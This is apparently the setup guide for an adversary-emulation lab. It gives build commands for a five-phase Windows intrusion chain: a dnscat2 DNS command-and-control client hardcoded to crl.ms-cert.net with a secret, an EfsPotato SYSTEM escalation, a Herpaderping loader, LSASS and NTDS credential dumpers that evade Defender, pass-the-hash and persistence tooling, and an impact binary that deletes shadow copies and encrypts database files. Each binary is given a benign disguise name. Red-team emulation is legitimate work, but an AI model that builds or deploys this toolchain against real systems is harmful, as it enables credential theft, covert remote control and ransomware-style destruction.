# Setup — IIS AppPool Escalation Path

## Phase 1 Payload Builds

Three binaries must be built before running Phase 1. Build order does not matter; all three are independent.

---

### 1. `svcmgr.exe` — dnscat2 DnsQuery_W C2 client

**Source:** `resources/payloads/rce-and-c2/dnscat2/go-client/`

```powershell
cd resources\payloads\rce-and-c2\dnscat2\go-client

go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o svcmgr.exe ./cmd/dnscat-dnsapi/
```

**Output:** `resources/payloads/rce-and-c2/dnscat2/go-client/svcmgr.exe`

This binary uses `dnsapi.dll!DnsQuery_W` — the UDP/53 socket is held by `svchost.exe` (Dnscache), not by the binary. Requires the system DNS on the target to resolve `crl.ms-cert.net`; the conditional forwarder on DC01 handles this in the lab.

---

### 2. `CertEnrollSvc.exe` — EfsPotato SYSTEM escalation tool

**Source:** `resources/payloads/priv-escalation/EfsPotato/`

```cmd
cd resources\payloads\priv-escalation\EfsPotato

csc /target:exe /platform:x64 /optimize+ /out:CertEnrollSvc.exe CertEnrollSvc.cs -nowarn:1691,618
```

**Output:** `resources/payloads/priv-escalation/EfsPotato/CertEnrollSvc.exe`

Reads a PE from stdin (4-byte LE size header + PE bytes), escalates via MS-EFSR named-pipe impersonation, and spawns the PE as `NT AUTHORITY\SYSTEM` via `CreateProcessWithTokenW`. The spawned binary's temp file is deleted after it exits.

---

### 3. `CWLHerpaderping.exe` — Process Herpaderping ghost-process loader

**Source:** `resources/payloads/process-injection/CWLHerpaderping/`

```powershell
cd resources\payloads\process-injection\CWLHerpaderping

msbuild CWLHerpaderping.sln `
    /p:Configuration=Release /p:Platform=x64 `
    /p:PayloadXOR=1 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.enc" `
    /t:Rebuild /m
```

**Output:** `resources/payloads/process-injection/CWLHerpaderping/x64/Release/CWLHerpaderping.exe`

- `PayloadXOR=1` — enables in-memory XOR decode of `CertCA.enc` (position-dependent XOR, same formula as `stage --encrypt`); without this flag the loader would try to load the file as a raw PE and fail.
- `CustomPayloadPath` — hardcodes `C:\ProgramData\CertCA.enc` as the payload path at compile time; this must match the destination path used in the `stage --encrypt` command in Phase 1.
- ETW patching (`/p:ETWPatch=1`) is **off** by default; do not add it unless explicitly testing T1562.006.

---

## Phase 2 Payload Builds

Two binaries must be built before running Phase 2. Build order does not matter; both are independent.

---

### 4. `WmiAvQuery.exe` — WMI security software discovery tool

**Source:** `resources/payloads/WmiAvQuery/`

Open *x64 Native Tools Command Prompt for VS 2022*, then from the repo root:

```cmd
cd resources\payloads\WmiAvQuery
cl.exe /EHsc /O2 /MT /Fe:WmiAvQuery.exe main.cpp /link /SUBSYSTEM:CONSOLE
```

**Output:** `resources/payloads/WmiAvQuery/WmiAvQuery.exe`

Queries `ROOT\SecurityCenter2` via `IWbemLocator` → `IWbemServices::ExecQuery` (`SELECT * FROM AntiVirusProduct`) to enumerate installed AV/EDR products. On Windows Server where SecurityCenter2 is unavailable, falls back to `ROOT\Microsoft\Windows\Defender` (`MSFT_MpComputerStatus`). WMI COM libraries (`wbemuuid.lib`, `ole32.lib`, `oleaut32.lib`, `advapi32.lib`) are pulled in via `#pragma comment(lib)` — no explicit `/link` flags needed.

---

### 5. `wdhelper.gz` — LSASS reflection dump tool (gzip-compressed)

**Source:** `resources/payloads/cred-access/LsassReflectDumping/ReflectDump/`

**Step 1 — Build `ReflectDump.exe`** (Visual Studio 2022 with *Desktop development with C++*, toolset v143, required)

Open *x64 Native Tools Command Prompt for VS 2022*, then from the repo root:

```cmd
cd resources\payloads\cred-access\LsassReflectDumping\ReflectDump
msbuild ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
```

**Output:** `resources\payloads\cred-access\LsassReflectDumping\ReflectDump\x64\Release\ReflectDump.exe`

Post-build verification — must pass before deployment:

```cmd
:: dbghelp.dll must NOT appear in the static IAT (runtime resolution must hold)
dumpbin /imports ReflectDump\x64\Release\ReflectDump.exe | findstr /i dbghelp
```

Step must print nothing. If `dbghelp.dll` appears, the static `#pragma comment(lib, "Dbghelp.lib")` link slipped back in.

**Step 2 — Gzip-compress to `wdhelper.gz`** (T1027.015 — reduces transfer size ~62%, avoids raw PE structure in transit)

```bash
cd resources/payloads/react2shell-tool
python compress_payload.py ../../cred-access/LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe -o wdhelper.gz -l 9
```

**Output:** `resources/payloads/react2shell-tool/wdhelper.gz`

The `stage` command in Phase 2 Step 3 picks up `wdhelper.gz` from this path (react2shell-tool is the working directory when the tool is launched). The binary is renamed to `wdhelper.exe` on the target after decompression via `zlib.gunzipSync`.

---

## Phase 3 Payload Builds

Four binaries must be built before running Phase 3. Build order does not matter; all are independent. `CertEnrollAgent.exe` (Herpaderping loader) is reused from Phase 1 Build #3 — no additional build required.

---

### 6. `dnscat2.exe` — persistence C2 binary

**Source:** `resources/payloads/rce-and-c2/dnscat2/go-client/`

Used as the source PE for three staged artifacts: `CertCA.enc` (XOR-encrypted for Herpaderping), `policyupdate.exe` (WMI subscription trigger), and `policysync.exe` (service-backed C2). Same source and flags as `svcmgr.exe` (Phase 1 Build #1) — only the output name differs.

```powershell
cd resources\payloads\rce-and-c2\dnscat2\go-client

go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o dnscat2.exe ./cmd/dnscat-dnsapi/
```

**Output:** `resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe`

Uses `dnsapi.dll!DnsQuery_W` — UDP/53 socket is held by `svchost.exe` (Dnscache). Requires the conditional forwarder on DC01 for `crl.ms-cert.net`. The `stage --encrypt` command in Phase 3 Step 1 reads this file and applies position-dependent XOR before base64-streaming.

---

### 7. `go-thehash.exe` — Pass-the-Hash SMB/WMI toolkit

**Source:** `resources/payloads/lateral-movement/go-thehash/`

```powershell
cd resources\payloads\lateral-movement\go-thehash

go mod tidy
$env:GOOS = "windows"; $env:GOARCH = "amd64"; go build -ldflags="-s -w" -o go-thehash.exe .
```

**Output:** `resources/payloads/lateral-movement/go-thehash/go-thehash.exe`

`go-smb` is vendored locally under `./go-smb` — build is fully offline, no external module fetch required. Authenticates via NTLMv2 using raw NT hash; no plaintext password, no Windows SSPI dependency. Used in Phase 3 Step 2 for SMB file transfer and WMI/SCM remote execution.

---

### 8. `ServiceInstaller.exe` — SCM API Windows service installer

**Source:** `resources/payloads/persistence/windows-service/advapi32-cpp/`

Open *x64 Native Tools Command Prompt for VS 2022*, then from the repo root:

```cmd
cd resources\payloads\persistence\windows-service\advapi32-cpp
cl /EHsc /O2 /MT /Fe:ServiceInstaller.exe main.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
```

**Output:** `resources/payloads/persistence/windows-service/advapi32-cpp/ServiceInstaller.exe`

Calls `OpenSCManagerW` → `CreateServiceW` → `ChangeServiceConfig2W` directly without spawning `sc.exe`. Service is immediately visible to SCM and generates System Event ID 7045 on install. Used in Phase 3 Step 7B.

---

### 9. `NtServiceInstaller.exe` — NT native API Windows service installer

**Source:** `resources/payloads/persistence/windows-service/syscalls-cpp/`

Open *x64 Native Tools Command Prompt for VS 2022*, then from the repo root:

```cmd
cd resources\payloads\persistence\windows-service\syscalls-cpp
cl /EHsc /O2 /MT /Fe:NtServiceInstaller.exe main.cpp nt_api.cpp service_installer.cpp advapi32.lib /link /SUBSYSTEM:CONSOLE
```

**Output:** `resources/payloads/persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe`

Writes service configuration directly to `HKLM\SYSTEM\CurrentControlSet\Services` via `NtOpenKey` / `NtCreateKey` / `NtSetValueKey` — bypasses `advapi32.dll` `CreateService` path. Does **not** generate System Event ID 7045; service appears only in the registry until reboot or SCM refresh. Used in Phase 3 Step 7.

---

## Phase 4 Payload Builds

One binary must be built before running Phase 4.

---

### 10. `PolicySyncSvc.exe` — NTDS raw-volume credential harvester

**Source:** `resources/payloads/cred-access/NtdsRawDump/NtdsRawDump.cs`

**From VS Developer Command Prompt:**

```cmd
cd resources\payloads\cred-access\NtdsRawDump

csc /optimize+ /debug- /out:PolicySyncSvc.exe NtdsRawDump.cs /r:System.Management.dll /r:System.IO.Compression.dll
```

**Output:** `resources/payloads/cred-access/NtdsRawDump/PolicySyncSvc.exe`

Reads `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` from a VSS shadow via raw NTFS cluster reads (`FSCTL_GET_RETRIEVAL_POINTERS` + raw `ReadFile` on the shadow volume device handle), bypassing WdFilter.sys minifilter callbacks. Each file is AES-256-CBC-encrypted in-memory before any disk write; the four `.tmp` blobs are then compressed into an in-memory `ZipArchive`, AES-256-CBC-encrypted again, base64-encoded, and written as `certstore.cmd` — a batch-script-masked container (`@echo off` stub + `set _b=<ciphertext>`). VSS creation and deletion are performed via WMI `Win32_ShadowCopy.Create()`/`.Delete()` — `vssadmin.exe` is never spawned. All operational `kernel32` APIs and IOC strings are resolved/decoded at runtime; none appear as static literals in the PE. Used in Phase 4 Step 1.

---

## Phase 5 Payload Builds

One binary must be built before running Phase 5.

---

### 11. `impact.exe` — Impact chain binary (VSS deletion + service stop + AES-256 encryption)

**Source:** `resources/payloads/impact/ImpactPayload/`

Open *x64 Native Tools Command Prompt for VS 2022*, then from the repo root:

```cmd
cd resources\payloads\impact\ImpactPayload
cl /O2 /MT /W4 impact.c aes.c /Fe:impact.exe /link ole32.lib
```

**Output:** `resources/payloads/impact/ImpactPayload/impact.exe`

Consolidates the Phase 5 Step 1 impact chain (T1490 + T1489 + T1486) into a single process with no child-process spawning:

- **VSS deletion** — loads `vssapi.dll` at runtime via `LoadLibraryW` and deletes all shadow copies through `IVssBackupComponents::DeleteSnapshots`; no `vssadmin.exe` spawned
- **Service stop / start** — resolves `OpenSCManagerW`, `OpenServiceW`, `ControlService`, `StartServiceW` via `GetProcAddress` at startup; `advapi32.lib` is **not linked** — absent from static IAT; no `sc.exe` spawned
- **AES-256-CBC encryption** — encrypts target `.mdf`/`.ldf` files in-place via memory-mapped I/O using the embedded `tiny-AES-c` implementation (`aes.c`); no dependency on `bcrypt.dll` or `advapi32` crypto

All sensitive strings (DLL names, API names, argument flags) are constructed as stack strings in `.text` — absent from `.rdata`. Deployed on the target as `CertMaint.exe`. Used in Phase 5 Step 1.
